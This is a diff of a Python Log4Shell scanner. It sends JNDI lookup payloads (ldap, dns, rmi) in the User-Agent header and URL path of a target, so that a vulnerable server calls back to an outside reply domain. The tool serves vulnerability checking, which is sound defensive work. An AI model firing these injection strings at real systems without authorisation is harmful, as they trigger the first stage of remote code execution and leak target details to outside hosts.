@@ -1,59 +1,98 @@
 #!/usr/bin/python3
+
+# With inspirations from Northwave and KPN, combined with my own styling
+
+import argparse
 import requests
 import uuid
 import logging
 import urllib3
 import time
 import sys
+import os
+from urllib.parse import urlparse
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO)
 
-# Change this to your DNS zone 
-HOSTNAME = "yourdns.zone.here"
 
-def main():
-    if len(sys.argv) != 2:
-        print("Usage python3 nw_log4check.py http://yoururl.com")
-        return
+def argparsing(exec_file):
+    parser = argparse.ArgumentParser(exec_file)
+    parser.add_argument("--reply-fqdn",
+                        dest='replyfqdn',
+                        help="Reply FQDN",
+                        default='log4jdnsreq.koeroo.net',
+                        type=str)
+    parser.add_argument("--target",
+                        dest='target',
+                        help="Target host to examine",
+                        default=None,
+                        type=str)
 
-    url_input = sys.argv[1]
-    identifier = uuid.uuid4()
+    args = parser.parse_args()
+    return args
 
-    logging.debug(f"Generated UUID: {identifier}")
-    logging.info(f"Sending request to {url_input} using User-Agent injection...")
+def check1(schema, url_input, reply_host, header_name, payl):
+    logging.info(f"check1: Sending request to {schema}{url_input.hostname} using {header_name} injecting {payl}")
 
     # Check 1 (User Agent)
     try:
-        """
-        Check inspired by: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
-        """
         requests.get(
-            url_input,
-            headers={'User-Agent': f'${{jndi:ldap://{identifier}.{HOSTNAME}/test.class}}'},
+            f"{schema}{url_input.hostname}",
+            headers={header_name: payl},
             verify=False
         )
     except requests.exceptions.ConnectionError as e:
-        logging.error(f"HTTP connection to target URL error: {e}")
+        logging.error(f"HTTP connection to {schema}{url_input.hostname} URL error: {e}")
+
+def check2(schema, url_input, reply_host, payl):
+    logging.info(f"check2: Sending request to {schema}{url_input.hostname} injecting {payl}")
 
     # Check 2 (Get request)
-    logging.info(f"Sending request to {url_input} using GET request injection: {url_input}/${{jndi:ldap://{identifier}.{HOSTNAME}/test.class}}")
     try:
         requests.get(
-            f"{url_input}/${{jndi:ldap://{identifier}.{HOSTNAME}/test.class}}",
+            f"{schema}{url_input.hostname}/{payl}",
             verify=False
         )
     except requests.exceptions.ConnectionError as e:
-        logging.error(f"HTTP connection to target URL error: {e}")
+        logging.error(f"HTTP connection to {schema}{url_input.hostname} URL error: {e}")
 
-    logging.info(f"Waiting 10 seconds for a response")
-    time.sleep(10)
 
-    logging.info(f"Checking DNS log file for requests (indicating a vulnerable system)...")
-    with open('/var/log/named/query.log') as f:
-        if f"{identifier}" in f.read():
-            logging.info(f"VULNERABLE! System at {url_input} is potentially vulnerable as we have seen an incoming DNS request to {identifier}.{HOSTNAME}")
-        else:
-            logging.info(f"NOT VULNERABLE! No incoming DNS request to {identifier}.{HOSTNAME} was seen while checking system at {url_input}")
+def deliver(url_input, reply_host, header_name, payl):
+    schema = ['http://', 'https://']
+
+    for s in schema:
+        check1(s, url_input, reply_host, header_name, payl)
+        check2(s, url_input, reply_host, payl)
+
+
+def payload_generation(url_input, reply_host):
+    identifier = uuid.uuid4()
+    logging.debug(f"Generated UUID: {identifier}")
+
+    payloads = []
+    payloads.append(f'${{jndi:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
+    payloads.append(f'${{jndi:dns://{identifier}.{url_input.hostname}.{reply_host}:53/test.class}}')
+    payloads.append(f'${{jndi:rmi://{identifier}.{url_input.hostname}.{reply_host}:1099/test.class}}')
+
+    header_name = 'User-Agent'
+
+    for payl in payloads:
+        deliver(url_input, reply_host, header_name, payl)
+
+
+def main():
+    # Arguments parsing
+    args = argparsing(os.path.basename(__file__))
+
+    # Parse URL
+    url_input = urlparse(args.target)
+    if url_input.hostname is None or not url_input.hostname:
+        url_input = urlparse('dummy://' + args.target)
+
+    # Generate payload and run it
+    payload_generation(url_input, args.replyfqdn)
+
 
 if __name__ == "__main__":
     main()
